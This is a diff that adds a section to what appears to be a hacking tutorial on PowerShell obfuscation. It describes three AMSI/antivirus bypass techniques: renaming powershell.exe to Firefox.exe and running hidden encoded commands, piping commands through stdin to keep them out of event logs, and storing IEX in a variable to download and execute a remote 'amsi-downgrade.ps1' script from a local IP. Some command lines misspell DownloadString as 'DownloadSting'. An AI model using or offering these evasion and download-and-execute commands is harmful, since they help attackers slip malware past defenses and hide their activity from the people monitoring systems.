@@ -707,6 +707,60 @@ Here we can view the all process of encoding/decoding in powershell console
 
 ---
 
+- More obscure obfuscated/bypass technics<br />
+
+      If the proccess name is 'powershell' and the command line arguments match some specific
+      patterns, AMSI/AV's will flag that input as malicious. there are 3 main ways to bypass it:
+
+<br />
+
+     1º - Obfuscate the name of the powershell binary in target system before execute any
+          powershell commands. This can be achieved by making a copy of powershell.exe and
+          rename it to Firefox.exe using an agent.bat before further head call the obfuscated
+          powershell binary (Firefox.exe) to execute our powershell command line arguments.
+
+          C:\Windows\System32\WindowsPowershell\v1.0\Firefox.exe -noP -wIn hIdDEn -enc ..SNIPET..
+
+![powershell rename](http://i.cubeupload.com/7z2OjF.jpg)
+![powershell rename](http://i.cubeupload.com/79wfQi.jpg)
+
+<br />
+
+     2º - Unlink the command-line arguments from the code they deliver, one example of that its
+          the ability of powershell to consume commands from the standart input stream ( pipe | )
+          When viewed in the event log, the arguments to powershell.exe are no longer visible.
+
+          cmd.exe /c "echo Get-ExecutionPolicy -List" | powershell.exe
+
+![powershell rename](http://i.cubeupload.com/adNz1U.jpg)
+
+<br />
+
+      3º - obfuscating powershell statements (IEX | Invoke-Expression | etc)
+           obfuscating this kind of 'calls' are not has easy like most powershell variables
+           declarations are, If we try to set any variable pointing to one powershell statement
+           then the interpreter will fail to descompress the variable into an command. The next
+           two screenshots shows how it fails if we try to use the conventional way, and how to
+           bypass it using the Invoke-Command statement that has the ability to transform inputs
+           into 'strings' that can deal with that limitation, allowing us to call the statement
+           IEX previous stored inside a local powershell variable .. 
+           
+           [The conventional way]
+           $obf="iex"
+           $obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
+           powershell $obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
+           Invoke-Command $obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
+
+![var declaration fail](http://i.cubeupload.com/b4lkyC.jpg)
+
+           [Using Invoke-Command statment wrapped in double quotes]
+           $obf="iex"
+           powershell -C "$obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')"
+
+![var declaration success](http://i.cubeupload.com/o87JMY.jpg)
+
+---
+
 [0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />
 [3] [All Hail to ''@danielbohannon'' for its extraordinary work (obfuscation) under powershell](https://www.sans.org/summit-archives/file/summit-archive-1492186586.pdf)<br />
 
